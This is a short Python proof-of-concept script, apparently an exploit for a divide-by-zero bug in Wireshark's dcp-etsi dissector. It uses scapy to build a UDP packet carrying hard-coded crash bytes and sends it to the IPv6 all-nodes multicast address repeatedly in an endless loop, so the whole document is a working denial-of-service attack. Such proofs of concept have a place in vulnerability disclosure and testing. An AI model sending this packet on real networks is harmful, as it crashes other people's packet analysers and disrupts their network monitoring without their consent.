#!/usr/bin/python
#divide by zero in dcp-etsi.c wireshark dissector
from scapy.all import *
from sys import *
crashdata='504623c4000000008854aa3d5a474547'.decode('hex')
packet=IPv6(dst="FF02::1")/UDP(dport=55935,sport=42404)/crashdata
send(packet,inter=1,loop=1) 

